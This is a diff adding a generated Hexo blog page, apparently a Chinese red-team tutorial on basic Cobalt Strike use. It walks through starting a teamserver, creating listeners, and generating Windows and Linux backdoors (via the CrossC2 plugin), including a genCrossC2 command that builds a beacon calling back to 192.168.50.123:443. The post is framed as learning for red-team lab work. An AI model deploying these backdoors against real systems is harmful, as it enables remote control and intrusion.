@@ -1,32 +1,288 @@
-extends includes/layout.pug
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  
+  <title>CobaltStrike基操 | k4i_x3i0&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言：最近和大哥们打了下红队，发现很多工具虽然知道，都还不是很熟悉。准备熟悉下这些工具的使用，这里只简单介绍了cs的上线方法，更多其他操作可以翻阅文档 启动服务端1.&#x2F;teamserver ip passwd   &#x2F;&#x2F;端口默认为50050  默认CS端口比较危险，若是泄露可能被他人登录。密码爆破脚本：https:&#x2F;&#x2F;github.com&#x2F;ryanohoro&#x2F;csbruter 修改端口方法：在tea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike基操">
+<meta property="og:url" content="http://example.com/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/index.html">
+<meta property="og:site_name" content="k4i_x3i0&#39;s blog">
+<meta property="og:description" content="前言：最近和大哥们打了下红队，发现很多工具虽然知道，都还不是很熟悉。准备熟悉下这些工具的使用，这里只简单介绍了cs的上线方法，更多其他操作可以翻阅文档 启动服务端1.&#x2F;teamserver ip passwd   &#x2F;&#x2F;端口默认为50050  默认CS端口比较危险，若是泄露可能被他人登录。密码爆破脚本：https:&#x2F;&#x2F;github.com&#x2F;ryanohoro&#x2F;csbruter 修改端口方法：在tea">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/typara/pictures/image-20230619170620522.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619173225201.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200251948.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200409400.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200834823.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114354411.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114516233.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114815036.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114927189.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620115029549.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620115220237.png">
+<meta property="article:published_time" content="2023-06-20T04:01:14.000Z">
+<meta property="article:modified_time" content="2023-06-20T04:07:38.734Z">
+<meta property="article:author" content="k4i_x3i0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/typara/pictures/image-20230619170620522.png">
+  
+    <link rel="alternate" href="/atom.xml" title="k4i_x3i0&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+<meta name="generator" content="Hexo 5.4.2"></head>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
-
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
-
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">k4i_x3i0&#39;s blog</a>
+      </h1>
       
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-CobaltStrike基操" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/" class="article-date">
+  <time datetime="2023-06-20T04:01:14.000Z" itemprop="datePublished">2023-06-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CobaltStrike基操
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前言：最近和大哥们打了下红队，发现很多工具虽然知道，都还不是很熟悉。准备熟悉下这些工具的使用，这里只简单介绍了cs的上线方法，更多其他操作可以翻阅文档</p>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver ip passwd   //端口默认为50050</span><br></pre></td></tr></table></figure>
+
+<p>默认CS端口比较危险，若是泄露可能被他人登录。密码爆破脚本：<a target="_blank" rel="noopener" href="https://www.3hack.com/go/aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vaG9yby9jc2JydXRlcg==">https://github.com/ryanohoro/csbruter</a></p>
+<p>修改端口方法：在teamserver中修改</p>
+<p><img src="../../../../typara/pictures/image-20230619170620522.png" alt="image-20230619170620522"></p>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>打开直接连接，用户名随便写</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619173225201.png" alt=" m       "></p>
+<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>创建监听器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200251948.png" alt="image-20230619200251948"></p>
+<p>生成后门：选择刚刚创建的监听器即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200409400.png" alt="image-20230619200409400"></p>
+<p>然后将生成的马传进目标靶机，运行即可。这里看到已经上现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200834823.png" alt="image-20230619200834823"></p>
+<p>###linux</p>
+<p>CS默认是没有生成linux后门的功能的，需要下载插件CrossC2</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/releases">https://github.com/gloxec/CrossC2/releases</a></p>
+<p>根据使用操作系统下载，其中<code>CrossC2-GithubBot-2023-03-27.cna</code>都要下载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114354411.png" alt="image-20230620114354411"></p>
+<p>下载后，修改<code>CrossC2-GithubBot-2023-03-27.cna</code>中的路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114516233.png" alt="image-20230620114516233"></p>
+<p>然后进入CS选择添加脚本，就添加刚刚的<code>CrossC2-GithubBot-2023-03-27.cna</code>文件即可。</p>
+<p>最后就是创建监听器，监听器需要选择https的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114815036.png" alt="image-20230620114815036"></p>
+<p>然后生成linux后门，（没有添加脚本的话是没有这个选项的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114927189.png" alt="image-20230620114927189"></p>
+<p>注意<code>.cobaltstrike.beacon_keys</code>文件是服务端里的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620115029549.png" alt="image-20230620115029549"></p>
+<p>除此之外还可以直接生后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./genCrossC2.Linux 192.168.50.123 443 .cobaltstrike.beacon_keys null Linux x64 /tmp/LinuxShell</span><br></pre></td></tr></table></figure>
+
+
+
+<p>build生成后，把马传进目标靶机执行即可上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620115220237.png" alt="image-20230620115220237"></p>
+<h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><p>CS还有许多功能，上面写的只是如何上线。各种攻击方法可以参考文档</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/" data-id="clj3rq0nc0000fkuq6gqi12os" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/06/21/Frp%E5%9F%BA%E6%93%8D/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Frp基操
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2023.5.3-6.1刷题日记</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/RedTeam/">RedTeam</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/RedTeam/" rel="tag">RedTeam</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/RedTeam/" style="font-size: 10px;">RedTeam</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/21/Frp%E5%9F%BA%E6%93%8D/">Frp基操</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/">CobaltStrike基操</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">2023.5.3-6.1刷题日记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/">渗透取经-vulStack1</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/">fastjson漏洞分析-1224-68</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 k4i_x3i0<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
